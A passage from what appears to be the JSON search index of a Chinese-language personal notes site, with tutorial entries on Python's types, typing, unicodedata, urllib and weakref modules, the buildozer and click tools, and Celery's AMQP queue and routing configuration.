GenericAlias\n\nlist[int] == GenericAlias(list, (int,))\nTrue\ndict[str, int] == GenericAlias(dict, (str, int))\nTrue 在 3.9.2 版更改: 此类型现在可以被子类化。 class types.UnionType 合并类型表达式 的类型。 class types.TracebackType(tb_next, tb_frame, tb_lasti, tb_lineno) The type of traceback objects such as found in sys.exception().__traceback__. types.FrameType 帧对象的类型，例如 tb.tb_frame 中的对象，其中 tb 是一个回溯对象。 types.GetSetDescriptorType 使用 PyGetSetDef 在扩展模块中定义的对象的类型，例如 FrameType.f_locals 或 array.array.typecode。\n此类型被用作对象属性的描述器；它的目的与 property 类型相同，但专门针对在扩展模块中定义的类。 types.MemberDescriptorType 使用 PyMemberDef 在扩展模块中定义的对象的类型，例如 datetime.timedelta.days。\n此类型被用作使用标准转换函数的简单 C 数据成员的描述器；它的目的与 property 类型相同，但专门针对在扩展模块中定义的类。 CPython 实现细节： 在 Python 的其它实现中，此类型可能与 GetSetDescriptorType 完全相同。 class types.MappingProxyType(mapping) 一个映射的只读代理。 它提供了对映射条目的动态视图，这意味着当映射发生改变时，视图会反映这些改变。 在 3.9 版更改: 更新为支持 PEP 584 所新增的合并 (|) 运算符，它会简单地委托给下层的映射。 key in proxy 如果下层的映射中存在键 key 则返回 True，否则返回 False。 proxy[key] 返回下层的映射中以 key 为键的项。 如果下层的映射中不存在键 key 则引发 KeyError。 iter(proxy) 返回由下层映射的键为元素的迭代器。 这是 iter(proxy.keys()) 的快捷方式。 len(proxy) 返回下层映射中的项数。 copy() 返回下层映射的浅拷贝。 get(key[, default]) 如果 key 存在于下层映射中则返回 key 的值，否则返回 default。\n如果 default 未给出则默认为 None，因而此方法绝不会引发 KeyError。 items() 返回由下层映射的项 ((键, 值) 对) 组成的一个新视图。 keys() 返回由下层映射的键组成的一个新视图。 values() 返回由下层映射的值组成的一个新视图。 reversed(proxy) 返回一个包含下层映射的键的反向迭代器。 附加工具类/函数 class types.SimpleNamespace 一个简单的 object 子类，提供了访问其命名空间的属性，以及一个有意义的 repr。 不同于 object，对于 SimpleNamespace 你可以添加和移除属性。 如果一个 SimpleNamespace 对象使用关键字参数进行初始化，这些参数会被直接加入下层命名空间。 此类型大致等价于以下代码: class SimpleNamespace:\n    def __init__(self, /, **kwargs):\n        self.__dict__.update(kwargs)\n\n    def __repr__(self):\n        items = (f\"{k}={v!r}\" for k, v in self.__dict__.items())\n        return \"{}({})\".format(type(self).__name__, \", \".join(items))\n\n    def __eq__(self, other):\n        if isinstance(self, SimpleNamespace) and isinstance(other, SimpleNamespace):\n          return self.__dict__ == other.__dict__\n        return NotImplemented SimpleNamespace 可被用于替代 class NS: pass。 但是，对于结构化记录类型则应改用 namedtuple()。 在 3.9 版更改: repr 中的属性顺序由字母顺序改为插入顺序 (类似 dict)。 types.DynamicClassAttribute(fget=None, fset=None, fdel=None, doc=None) 在类上访问 __getattr__ 的路由属性。 这是一个描述器，用于定义通过实例与通过类访问时具有不同行为的属性。 当实例访问时保持正常行为，但当类访问属性时将被路由至类的 __getattr__ 方法；这是通过引发 AttributeError 来完成的。 这允许有在实例上激活的特性属性，同时又有在类上的同名虚拟属性 (一个例子请参见 enum.Enum)。 协程工具函数 types.coroutine(gen_func) This function transforms a generator function into a coroutine function which returns a generator-based coroutine.\nThe generator-based coroutine is still a generator iterator,\nbut is also considered to be a coroutine object and is awaitable.\nHowever, it may not necessarily implement the __await__() method. 如果 gen_func 是一个生成器函数，它将被原地修改为异步生成器函数。 如果 gen_func 不是一个生成器函数，则它会被包装。 如果它返回一个 collections.abc.Generator 的实例，该实例将被包装在一个 awaitable 代理对象中。 所有其他对象类型将被原样返回。 3.5 新版功能.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-types.html","loc":"/yq-docs-rear-end-python-python-standard-library-types.html"},{"title":"typing","text":"类型注解模块 Union Union 是当有多种可能的数据类型时使用，比如函数有可能根据不同情况有时返回str或返回list，那么就可以写成: Union[list, str] Optional Optional 是Union的一个简化， 当 数据类型中有可能是None时，比如有可能是str也有可能是None，\n则: Optional[str] 相当于: Union[str, None] 注意 和 函数有默认参数None有区别，有区别，有区别，不可省略默认参数，如下示例: # 原始\ndef func(args = None):\n\n# 错\ndef func(args:Optional[str]) -> None:\n\n# 对\ndef func(args:Optional[str] = None) -> None: Type 表示值为所指定类或其子类: arg1: Type[ClassObj] Callable 表示可调用对象, 支持指定参数与返回值. eg, 异步函数的类型注解: Callable[..., Awaitable] 表示是async函数, 且参数任意, 相当于此函数: async def fun(...) -> Awaitable: 判断注解是否引入了typing Python 中没有强定义类型, 不过可以使用类型注解, 如: @dataclass\nclass Person(object):\n  name: str\n  pet: List[Cat] = field(default_factory=list)\n  pet2: Cat = field(default_factory=Cat) 类型注解除了使用基础的数据类型, 还可以使用 typing 模块下的定义, 判断是否是typing下的注解: from typing import _GenericAlias\n\nfor f in fields(Person):\n  print('type', f.type)\n  if isinstance(f.type, _GenericAlias):\n    print(f'{f.name} is isinstance of _GenericAlias') 获取typing注解的详细信息 获取注解参数列表, 使用: typing.get_args() 获取注解的详细类型, 如: In [31]: import typing\n\nIn [32]: typing.get_args(typing.Dict[str, tuple])\nOut[32]: (<class 'str'>, <class 'tuple'>) 返回结果是一个元组 获取相关基础类型 获取注解原始类型, 使用 typing.get_origin In [33]: typing.get_origin(typing.Dict[str, tuple])\nOut[33]: <class 'dict'>","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-typing.html","loc":"/yq-docs-rear-end-python-python-standard-library-typing.html"},{"title":"unicodedata","text":"定义了以下函数 unicodedata.lookup(name) 按名称查找字符。如果找到具有给定名称的字符，则返回相应的字符。 如果没有找到，则 KeyError 被引发。 在 3.3 版更改: 已添加对名称别名 1 和命名序列 2 的支持。 unicodedata.name(chr[, default]) 返回分配给字符 chr 的名称作为字符串。\n如果没有定义名称，则返回 default ，如果没有给出，则 ValueError 被引发。 unicodedata.decimal(chr[, default]) 返回分配给字符 chr 的十进制值作为整数。\n如果没有定义这样的值，则返回 default ，如果没有给出，则 ValueError 被引发。 unicodedata.digit(chr[, default]) 返回分配给字符 chr 的数字值作为整数。\n如果没有定义这样的值，则返回 default ，如果没有给出，则 ValueError 被引发。 unicodedata.numeric(chr[, default]) 返回分配给字符 chr 的数值作为浮点数。\n如果没有定义这样的值，则返回 default ，如果没有给出，则 ValueError 被引发。 unicodedata.category(chr) 返回分配给字符 chr 的常规类别为字符串。 unicodedata.bidirectional(chr) 返回分配给字符 chr 的双向类作为字符串。如果未定义此类值，则返回空字符串。 unicodedata.combining(chr) 返回分配给字符 chr 的规范组合类作为整数。如果没有定义组合类，则返回 0 。 unicodedata.east_asian_width(chr) 返回分配给字符 chr 的东亚宽度作为字符串。 unicodedata.mirrored(chr) 返回分配给字符 chr 的镜像属性为整数。\n如果字符在双向文本中被识别为\"镜像\"字符，则返回 1 ，否则返回 0 。 unicodedata.decomposition(chr) 返回分配给字符 chr 的字符分解映射作为字符串。如果未定义此类映射，则返回空字符串。 unicodedata.normalize(form, unistr) 返回 Unicode 字符串 unistr 的正常形式 form 。\nform 的有效值为 'NFC' 、 'NFKC' 、 'NFD' 和 'NFKD' 。 Unicode 标准基于规范等价和兼容性等效的定义定义了 Unicode 字符串的各种规范化形式。\n在 Unicode 中，可以以各种方式表示多个字符。\n例如，字符 U+00C7 （带有 CEDILLA 的 LATIN CAPITAL LETTER C ）也可以表示为序列\nU+0043（ LATIN CAPITAL LETTER C ）U+0327（ COMBINING CEDILLA ）。 对于每个字符，有两种正规形式：正规形式 C 和正规形式 D 。\n正规形式D（NFD）也称为规范分解，并将每个字符转换为其分解形式。\n正规形式C（NFC）首先应用规范分解，然后再次组合预组合字符。 即: NFC 表示字符应该是整体组 成 (比如可能的话就使用单一编码) NFD 表示字符应该分解为多个组合字符表示 除了这两种形式之外，还有两种基于兼容性等效的其他常规形式。\n在 Unicode 中，支持某些字符，这些字符通常与其他字符统一。\n例如， U+2160（ROMAN NUMERAL ONE）与 U+0049（LATIN CAPITAL LETTER I）完全相同。\n但是， Unicode 支持它与现有字符集（例如 gb2312 ）的兼容性。 正规形式KD（NFKD）将应用兼容性分解，即用其等价项替换所有兼容性字符。\n正规形式KC（NFKC）首先应用兼容性分解，然后是规范组合。 即使两个 unicode 字符串被规范化并且人类读者看起来相同，如果一个具有组合字符而另一个没有，则它们可能无法相等。 unicodedata.is_normalized(form, unistr) 判断 Unicode 字符串 unistr 是否为正规形式 form。 form 的有效值为 'NFC', 'NFKC', 'NFD' 和 'NFKD'。 3.8 新版功能. 此外，该模块暴露了以下常量： unicodedata.unidata_version 此模块中使用的 Unicode 数据库的版本。 unicodedata.ucd_3_2_0 这是一个与整个模块具有相同方法的对象，\n但对于需要此特定版本的 Unicode 数据库（如 IDNA ）的应用程序，则使用 Unicode 数据库版本 3.2 。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-unicodedata.html","loc":"/yq-docs-rear-end-python-python-standard-library-unicodedata.html"},{"title":"urllib","text":"url编码 parse.urlencode, 将python字典数据返回url格式的数据 parse.quote, 将url格式数据编码 parse.unquote, 上一个结果的解码, 返回普通url格式数据 例: data = {'a': 1, 'b': 2, }\n\n# 将python对象转换为url格式\nr = parse.urlencode(data)\n_logger.info(r)         # a=1&b=2\n\n# url 编码， & = 等字符都会被编码\nr = parse.quote(r)\n_logger.info(r)         # a%3D1%26b%3D2\n\n# url 解码， 仅转换为普通字符传拼接的形式\nr = parse.unquote(r)\n_logger.info(r)         # a=1&b=2","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-urllib.html","loc":"/yq-docs-rear-end-python-python-standard-library-urllib.html"},{"title":"weakref","text":"弱引用 官网: https://docs.python.org/zh-cn/3/library/weakref.html weakref 模块允许Python程序员创建对象的 weak references 。 在下文中，术语 referent 表示由弱引用引用的对象。 对对象的弱引用不能保证对象存活：当对像的引用只剩弱引用时， garbage collection 可以销毁引用并将其内存重用于其他内容。\n但是，在实际销毁对象之前，即使没有强引用，弱引用也一直能返回该对象。 弱引用的主要用途是实现保存大对象的高速缓存或映射，但又不希望大对象仅仅因为它出现在高速缓存或映射中而保持存活。 最常用: class weakref.ref(object[, callback]) 返回对 对象 的弱引用。如果原始对象仍然存活，则可以通过调用引用对象来检索原始对象；\n如果引用的原始对象不再存在，则调用引用对象将得到 None 。\n如果提供了 回调 而且值不是 None ，并且返回的弱引用对象仍然存活，则在对象即将终结时将调用回调;\n弱引用对象将作为回调的唯一参数传递；指示物将不再可用。 许多弱引用也允许针对相同对象来构建。 为每个弱引用注册的回调将按从最近注册的回调到最早注册的回调的顺序被调用。 回调所引发的异常将记录于标准错误输出，但无法被传播；它们会按与对象的 __del__() 方法所引发的异常相同的方式被处理。 如果 object 可哈希，则弱引用也为 hashable。\n即使在 object 被删除之后它们仍将保持其哈希值。\n如果 hash() 在 object 被删除之后才首次被调用，则该调用将引发 TypeError。 弱引用支持相等检测，但不支持排序比较。\n如果被引用对象仍然存在，两个引用具有与它们的被引用对象一致的相等关系（无论 callback 是否相同）。\n如果删除了任一被引用对象，则仅在两个引用对象为同一对象时两者才相等。 这是一个可子类化的类型而非一个工厂函数。 __callback__\n这个只读属性会返回当前关联到弱引用的回调。 如果回调不存在或弱引用的被引用对象已不存在，则此属性的值为 None。\n在 3.4 版更改: 添加了 __callback__ 属性。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-weakref.html","loc":"/yq-docs-rear-end-python-python-standard-library-weakref.html"},{"title":"buildozer","text":"暂时找到的官网文档: https://buildozer.readthedocs.io/en/latest/installation.html 一个用于构建Python应用程序的命令行工具, 可以将python代码打包为安卓的APK或者IPhone的IPA. 注解 这玩意儿一开始只是为了kivy这个开源跨平台GUI框架开发的, 后面升级了支持基本上所有的Python了,\n就是需要手动配置. 安装: pip install buildozer 主要特点 跨平台支持： Buildozer可以在多个操作系统上使用，包括Windows、Linux和macOS等。 简单易用： 用户只需要编辑buildozer.spec文件，即可轻松配置应用程序的构建选项和依赖项。 自动化依赖管理： Buildozer会自动下载和安装所需的依赖项和库，而无需手动干预。 支持Python 2和3： Buildozer可以进行Python版本选择，并在构建过程中自动处理不同版本的差异。 多种构建选项： Buildozer支持多种构建选项，例如debug和release版本、ARM和x86架构等。 高度可定制： Buildozer提供了大量的命令行选项和配置选项，以满足不同场景下的定制需求。 使用流程 配置文件设置 buildozer.spec 创建一个新的buildozer.spec文件。\n该文件包含应用程序的配置和相关信息，例如应用程序名称、作者、版本号和依赖项等。\n可以使用命令: buildozer init 来创建一个默认的buildozer.spec文件. 编辑buildozer.spec文件以包含所需的构建配置。\n可以在此文件中指定需要的权限、启动屏幕、应用程序图标等。 应用的版本, 可以自动探测, 直接在文件入口的py文件加入: __version__ = \"1.0.3\" 即可 配置项说明 title：应用程序的名称。 package.name：应用程序的包名。 package.domain：应用程序的域名。 source.dir：应用程序的源代码目录。 requirements：应用程序所需的Python库和第三方库。 android.permissions：应用程序需要的Android权限。 android.api：应用程序需要的Android API级别。 android.sdk：Android SDK的路径。 ios.codesign.identity：iOS代码签名的身份。 APK构建(安卓使用) 安卓编译需要的前置包 debian/ubuntu20/22 sudo apt update\nsudo apt install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev\npip3 install --user --upgrade Cython==0.29.33 virtualenv  # the --user should be removed if you do this in a venv\n\n# add the following line at the end of your ~/.bashrc file\nexport PATH=$PATH:~/.local/bin/ windows10/11, 需要打开 WSL的支持, 然后同样执行上述指令. MacOs: python3 -m pip install --user --upgrade Cython==0.29.33 virtualenv  # the --user should be removed if you do this in a venv\nbrew install pkg-config sdl2 sdl2_image sdl2_ttf sdl2_mixer gstreamer autoconf automake 通过使用: buildozer android debug 命令来构建debug版本的APK文件， 或者使用: buildozer android release 命令来构建发布版本的APK文件。 这将会自动下载并构建所有必要的依赖项，生成二进制文件，并将其打包到一个APK文件中。 IPA构建(苹果使用) 构建iOS应用程序（可选）。\n如果需要构建iOS应用程序，则需要在Mac OS系统上进行，并设置Xcode环境和相关证书等。\n可以使用 buildozer ios debug 或 buildozer ios release 命令来构建iOS应用程序。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Buildozer.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Buildozer.html"},{"title":"click","text":"click 是对 Argparse 进行封装后的一个 python 命令行工具\n(类似 request 对 urllib 的封装) 命令行工具, 使用装饰器配置选项参数. 普通形式 , 一个函数上打上所有选项参数 组 , 以组的形式使用 普通形式 如: import sys\n\nimport click\n\n@click.command()        # 表示包装为 click 指令\n@click.option('-u', '--user', type=str, help='username')         # 添加选项参数\n@click.option('-p', '--password', type=str, help='password')         # 添加选项参数\n@click.option('-a', '--about', type=str, help='about message', default=None, show_default=True)         # 添加选项参数\n@click.option('--admin', type=bool, default=False)         # 添加选项参数\ndef run(user: str, password: str, about: str='about message', admin: bool = False):\n\n    if user == 'xxx':\n        click.echo('login failed', err=True)\n        return\n    elif user and password:\n        click.echo('login success')\n    if admin:\n        click.echo('you are a admin')\n    click.echo(f'{about = }')\n\n\nif __name__ == '__main__':\n    run(sys.argv[1:]) 效果: yanque@yanquedembp with_click % python click_one_f.py --help\nUsage: click_one_f.py [OPTIONS]\n\nOptions:\n  -u, --user TEXT      username\n  -p, --password TEXT  password\n  -a, --about TEXT     about message\n  --admin BOOLEAN\n  --help               Show this message and exit.\nyanque@yanquedembp with_click % python click_one_f.py\nabout = None\nyanque@yanquedembp with_click % python click_one_f.py -u xxx -p xxx\nlogin failed\nyanque@yanquedembp with_click % python click_one_f.py -u xxxx -p xxx\nlogin success\nabout = None 组 创建组，就是通过一个主入口函数，去关联其他的函数，其他的函数名可以作为命令直接使用: import sys\nimport click\n\n@click.group()\ndef main():\n    ...\n\n@main.command()        # 表示包装为 click 指令\n@click.option('-u', '--user', required=True, type=str, help='username')         # 添加选项参数\ndef login_user(user: str):\n    ...\n\n@main.command()\n@click.option('-p', '--password', required=True, type=str, help='password')         # 添加选项参数\ndef login_password(password: str):\n    ...\n\nif __name__ == '__main__':\n    main(sys.argv[1:]) 效果: yanque@yanquedembp with_click % python click_group_f.py --help\nUsage: click_group_f.py [OPTIONS] COMMAND [ARGS]...\n\nOptions:\n  --help  Show this message and exit.\n\nCommands:\n  login-password\n  login-user 使用 支持单函数使用与group分组使用 @click.group()        分组使用 @click.command()      作为命令行选项使用 @click.argument()     位置参数 @click.option()       关键字参数\n- default\n- type\n- help\n- show_default import click @click . command () @click . option ( '-m' , '--msg' , help = 'this is use to echo a msg' ) def show_msg ( msg ): click . echo ( 'input ' + msg ) @click . command () @click . option ( '-i' , # 短选项 '--int_v' , # 长选项， 注意与函数的参数名一致 # type=int, default = 1 , # 用默认值就可以不用 type=int help = 'echo a int value' , show_default = True ) def show_int ( int_v : int ): click . echo ( 'input ' + str ( int_v )) @click . command () @click . argument ( 'name' ) # 相当于 python 位置参数 @click . option ( '-i' , # 短选项， 相当于 python 关键字参数 '--int_v' , # 长选项， 注意与函数的参数名一致 # type=int, default = 1 , # 用默认值就可以不用 type=int help = 'echo a int value' , show_default = True ) def show_int2 ( name , int_v : int ): click . echo ( 'input ' + name + str ( int_v )) @click . group () def use_group (): pass @use_group . command ( help = 'show a msg' ) @click . option ( '-m' , '--msg' , help = 'this is use to echo a msg' ) def group_show_msg ( msg ): click . echo ( 'input ' + msg ) @use_group . command ( help = 'show a integer msg' ) @click . option ( '-i' , # 短选项 '--int_v' , # 长选项， 注意与函数的参数名一致 # type=int, default = 1 , # 用默认值就可以不用 type=int required = True , help = 'echo a int value' , show_default = True ) def group_show_int ( int_v : int ): click . echo ( 'input ' + str ( int_v )) def main (): # # 单个使用方式， 直接调用函数, 一次只能用一个 # # 使用默认值的调用 python3 t_click.py， 输出 input 1 # # 不使用默认值的调用 python3 t_click.py -i 10， 输出 input 10 # show_int() # # show_msg() # group 组的形式， 组会自动关联所有可调用函数(即command) # 一次只能使用一个选项 # python3 t_click.py group-show-msg -m tt #   输出 input tt # python3 t_click.py group-show-int #   输出 input 1 use_group () if __name__ == '__main__' : main () 非装饰器调用 click.echo(...)                               类似于 print click.ClickException(...)             rasie使用 click.get_current_context()   获取全局上下问, 单线程内有效","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-CLICK.html","loc":"/yq-docs-rear-end-python-python-three--party-library-CLICK.html"},{"title":"AMQP 入门","text":"celery 基本上全部兼容了 AMQP 的实现, 所以此处对此作一个了解说明. 消息 一个消息由消息头和消息体组成。 Celery 使用消息头来存储消息的内容类型以及内容的编码。\n内容类型通常是用来序列化消息的序列化格式，\n消息体包含要执行的任务的名称，任务ID(UUID)，执行任务的参数以及一些额外的元数据(比如重试次数和ETA(下次执行任务的时间))。 这是通过一个 Python 的字典来表示的示例任务消息: {'task': 'myapp.tasks.add',\n'id': '54086c5e-6193-4575-8308-dbab76798756',\n'args': [4, 4],\n'kwargs': {}} 生产者，消费者和中间人 发送消息的客户端通常被称为一个发布者，或一个生产者，而接收消息的实体被称为消费者。 中间人是将消息从生产者路由到消费者的消息服务器。 你可能在与AMQP相关的材料中看到这些术语被大量使用。 交换机，队列和路由键 消息将被发送到交换机 交换机将消息路由到一个或者多个队列。存在多种交换机类型来提供不同的消息路由方式，或实现不同的消息发送方案。 消息将在队列中等待直到有人消费它。 一旦消息被确认消费，将会从队列中删除。 发送和接收消息所需要的步骤如下: 创建一个交换机 创建一个队列 绑定队列到交换机。 为了使 task_queues 中的队列工作， Celery 将会自动创建所需要的实体(除非队列的 auto_declare 选项被设置为 False )。 下方是一个包含三个队列的示例队列配置; 一个用于视频，一个用于图片，另一个用于其他消息的默认队列: from kombu import Exchange, Queue\n\napp.conf.task_queues = (\n    Queue('default', Exchange('default'), routing_key='default'),\n    Queue('videos',  Exchange('media'),   routing_key='media.video'),\n    Queue('images',  Exchange('media'),   routing_key='media.image'),\n)\napp.conf.task_default_queue = 'default'\napp.conf.task_default_exchange_type = 'direct'\napp.conf.task_default_routing_key = 'default' 交换机类型 直连交换机 主题交换机 交换机的类型定义了交换机将会如何路由消息。\n在正常情况下交换机被定义为 direct, topic, fanout。\n此外也可以通过 RabbitMQ 的插件来使用非标准的交换机类型，\n比如由 Michael Bridgen 实现的 last-value-cache plug-in 。 直连交换机 直连交换机通过精确的路由键来进行匹配，所以被路由键 video 绑定的队列只接收具有该路由键的消息。 主题交换机 主题交换机通过以点分隔的单词和通配符来匹配路由键: *(匹配单个单词)\n#(匹配零或多个单词)。 假如有如下路由键: usa.news\nusa.weather\nnorway.news\nnorway.weather 可以通过绑定 *.news 来接收所有的新闻，\n绑定 usa.# 来接收与 USA 有关的所有消息，\n或绑定 usa.weather 来接收所有与 USA 天气有关的消息。 相关的API命令 declare 通过名称声明交换机 declare exchange.declare(exchange_name, type, passive, durable, auto_delete, internal) 通过名称声明交换机 passive: 被动意味着不会创建交换机，但是你可以通过这个参数来检查交换机是否被创建。 durable: 交换机将被持久化(也就是说，中间人(Broker)重启后，交换机仍然存在) auto_delete: 指定该参数意味着如果没有队列使用该交换机，那么交换机将被中间人(Broker)删除。 详情见 https://docs.celeryq.dev/projects/amqp/en/latest/reference/amqp.channel.html#amqp.channel.Channel.exchange_declare queue.declare(queue_name, passive, durable, exclusive, auto_delete) 通过名称声明一个队列 exclusive: 专有队列只能通过当前的连接进行消费，专有队列也同时是自动删除的 queue.bind(queue_name, exchange_name, routing_key) 通过路由键(routing_key)将队列绑定到交换机 队列如果没有被绑定将不会接收消息，因为绑定是必须的 queue.delete(name. If_unused=False, if_empty=False) 删除队列及其绑定 exchange.delete(name. If_unused=False) 删除交换机 注解 声明并不代表创建，在你声明的时候，你可以断定这个实体已经存在，并且是可操作的。\n这里并没有规定消费者或生产者中的哪一方需要最先创建交换机/队列/绑定。 通常来说，最先需要它的哪一方就会创建它。 使用 API Celery 自带了一个名为 celery amqp 的工具，用于通过命令行来操作 AMQP API 去管理任务，\n比如说创建或者删除队列或交换机，清理队列或发送消息。\n该工具也可以用于 非 AMQP 的中间人，但是不一定实现了所有的命令操作。 你可以直接在`celery amqp 的命令里写参数，或者无参数启动命令模式: $ celery -A proj amqp\n-> connecting to amqp://guest@localhost:5672/.\n-> connected.\n1> 这里的 1> 是命令提示。数字 1 表示到目前为止指定的命令数。 输入 help 可以得到所有可用的命令列表。工具还支持自动补全，所以你可以输入一个命令然后按 tab 键来显示可能匹配到的命令列表。\n让我们创建一个你可以发送消息的队列: 1> exchange.declare testexchange direct\nok.\n2> queue.declare testqueue\nok. queue:testqueue messages:0 consumers:0.\n3> queue.bind testqueue testexchange testkey\nok. 上方的命令创建了一个直连交换机 testexchange 和一个名为 testqueue 的队列。该队列通过路由键 testkey 绑定到直连交换机。\n从现在开始，所有发送到 testexchange 交换机的带有路由键testkey 的消息将被移动到队列 testqueue 中。\n你可以通过 basic.publish 命令发送一条消息: 4> basic.publish 'This is a message!' testexchange testkey\nok. 现在消息已经发送出去，你可以去获取消息了。\n你可以在这里使用 basic.get 命令，该命令将会以同步轮询的方式去获取队列中的新消息\n(这种方式对于维护任务来说是还可以的，但是对于服务来说，你需要使用 basic.consume命令来代替它)\n从队列中弹出一条消息: {'body': 'This is a message!',\n'delivery_info': {'delivery_tag': 1,\n                  'exchange': u'testexchange',\n                  'message_count': 0,\n                  'redelivered': False,\n                  'routing_key': u'testkey'},\n'properties': {}} AMQP 使用确认来表明一条消息已经被接收并且成功处理。\n如果消息没有被确认并且消费者的通道关闭了，消息将被传递给另一个消费者。\n请注意上方结构中列出来的传递标记 delivery_tag ;\n再每个连接通道中，每个接收到的消息都有一个唯一的传递标记，这个标记用来确认消息。\n但是要注意，传递标记并不是跨连接唯一的，所以在另一个客户端中，传递标记为 1 的消息可能与当前连接中的消息是不一致的。 你可以通过 basic.ack 命令来确认你收到的消息: 6> basic.ack 1\nok. 在我们的测试回话结束后，你应该清除你创建的实体: 7> queue.delete testqueue\nok. 0 messages deleted.\n8> exchange.delete testexchange\nok. 路由任务 队列声明 在 Celery 存在的队列可以通过 task_queues 来设置。 下方是一个包含三个队列的示例队列配置; 一个用于视频，一个用于图片，另一个用于其他消息的默认队列: default_exchange = Exchange('default', type='direct')\nmedia_exchange = Exchange('media', type='direct')\n\napp.conf.task_queues = (\n    Queue('default', default_exchange, routing_key='default'),\n    Queue('videos', media_exchange, routing_key='media.video'),\n    Queue('images', media_exchange, routing_key='media.image')\n)\napp.conf.task_default_queue = 'default'\napp.conf.task_default_exchange = 'default'\napp.conf.task_default_routing_key = 'default' 在这里 task_default_queue 指定队列将被用于路由那些没有显示指定队列的任务。 task_default_exchange，exchange type 以及routing key 将被用作于任务的默认值，\n并且也被用作于 task_queues 中的实体的默认值。 对单个队列的多个绑定也是被支持的。如下一个两个路由键同时绑定于同一个队列的例子: from kombu import Exchange, Queue, binding\n\nmedia_exchange = Exchange('media', type='direct')\n\nCELERY_QUEUES = (\n    Queue('media', [\n        binding(media_exchange, routing_key='media.video'),\n        binding(media_exchange, routing_key='media.image'),\n    ]),\n) 指定任务目标 任务的目标是通过如下的(按顺序)的方式决定的: Task.apply_async 的路由参数 在任务本身定义的路由参数 在 task_routes 中定义的 Routers 最好的做法是不在配置中进行硬编码，而是将其作为 Routers 的配置。这是最灵活的，并且合理的默认值仍然可以设置为任务的属性。 路由器 路由器是决定任务的路由选项的函数。 定义一个新的路由器，你所需要做的是通过签名 (name, args, kwargs, options, task=None, **kw) 定义一个函数: def route_task(name, args, kwargs, options, task=None, **kw):\n        if name == 'myapp.tasks.compress_video':\n            return {'exchange': 'video',\n                    'exchange_type': 'topic',\n                    'routing_key': 'video.compress'} 如果你返回队列的键值，它将会带着在task_queues 中定义的配置展开: {'queue': 'video', 'routing_key': 'video.compress'} 变成 -> {'queue': 'video',\n'exchange': 'video',\n'exchange_type': 'topic',\n'routing_key': 'video.compress'} 你可以通过将路由器的类添加到 task_routes 的配置中来安装路由器: task_routes = (route_task,) 路由器方法也可以通过名称添加: task_routes = ('myapp.routers.route_task',) 对于类似上方示例的简单的任务名称->路由映射，你可以简单地将字典放置在 task_routes 中来过的同样的行为效果: task_routes = {\n    'myapp.tasks.compress_video': {\n        'queue': 'video',\n        'routing_key': 'video.compress',\n    },\n} 将会按照顺序遍历路由器，直到在第一个返回真的路由器处停止，并将该路由器用作为任务的最终路由器。\n你也可以将多个路由器定义在一个序列中: task_routes = [\n    route_task,\n    {\n        'myapp.tasks.compress_video': {\n            'queue': 'video',\n            'routing_key': 'video.compress',\n    },\n] 路由器将会被按顺序访问，并选择第一个返回的值。\n如果你使用的是 Redis 或 RabbitMQ ，你也可以在路由器中指定队列的默认优先级: task_routes = {\n    'myapp.tasks.compress_video': {\n        'queue': 'video',\n        'routing_key': 'video.compress',\n        'priority': 10,\n    },\n} 类似的，对任务使用 apply_async 调用时，传递的参数将会覆盖默认的优先级: task.apply_async(priority=0) 优先级顺序和集群响应 需要重视的是，因为职程(worker) 的预取机制，如果同一时间提交了一堆任务，那么它们的优先级顺序可能发生混乱。\n禁用职程的预取可以防止该问题，但是对于小而快的任务，这么做会导致达不到理想的性能。\n在大多数情况下，简单的将 worker_prefetch_multiplier 参数减少到 1，\n是一个简单而清晰的方式来提升系统的灵敏性，并且不会存在禁用预取带来的成本。\n要注意的是优先级的顺序是按照值的反序来排列的：0 是最高优先级。 广播 Celery 也支持广播路由。下面是一个 broadcast_tasks 交换机的示例, 它将任务分发给所有连接到它的职程: from kombu.common import Broadcast\n\napp.conf.task_queues = (Broadcast('broadcast_tasks'),)\napp.conf.task_routes = {\n    'tasks.reload_cache': {\n        'queue': 'broadcast_tasks',\n        'exchange': 'broadcast_tasks'\n    }\n} 现在任务 tasks.reload_cache 将会被被发送给从当前队列中消费的所有职程。\n如下是另一个关于广播路由的任务，这次使用了 celery beat 定时器: from kombu.common import Broadcast\nfrom celery.schedules import crontab\n\napp.conf.task_queues = (Broadcast('broadcast_tasks'),)\n\napp.conf.beat_schedule = {\n    'test-task': {\n        'task': 'tasks.reload_cache',\n        'schedule': crontab(minute=0, hour='*/3'),\n        'options': {'exchange': 'broadcast_tasks'}\n    },\n} 广播和结果 注意 Celery 结果并没有定义如果有两个任务使用同一个任务 ID 时会发生什么。\n如果同一个人任务被派发到多于一个职程，该任务的状态历史将不被保留。\n在这种情况下设置 task.ignore_result 属性忽略任务结果将会是个好主意。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-AMQP-Introduction.html","loc":"/yq-docs-rear-end-python-python-three--party-library-Clery_more-AMQP-Introduction.html"},{"title":"应用设计(编码)拓展","text":"任务基类更新 装饰器的 base 参数可以指定继承的任务基类: import celery\n\nclass MyTask(celery.Task):\n\n    def on_failure(self, exc, task_id, args, kwargs, einfo):\n        print('{0!r} failed: {1!r}'.format(task_id, exc))\n\n@task(base=MyTask)\ndef add(x, y):\n    raise KeyError() 也可以手动直接更新 app 基类属性: >>> from celery import Celery, Task\n\n>>> app = Celery()\n\n>>> class MyBaseTask(Task):\n...    queue = 'hipri'\n\n>>> app.Task = MyBaseTask\n>>> app.Task\n<unbound MyBaseTask>\n\n>>> @app.task\n... def add(x, y):\n...     return x + y\n\n>>> add\n<@task: __main__.add>\n\n>>> add.__class__.mro()\n[<class add of <Celery __main__:0x1012b4410>>,\n<unbound MyBaseTask>,\n<unbound Task>,\n<type 'object'>] 调用实例方法 在 celery 中也叫绑定方法, 使用 bind 参数 被绑定的任务意味着任务的第一个参数总是任务实例（self），就像Python绑定方法一样: logger = get_task_logger(__name__)\n\n@task(bind=True)\ndef add(self, x, y):\n    logger.info(self.request.id) 注意这里的 self 是 task 实例","tags":"后端; 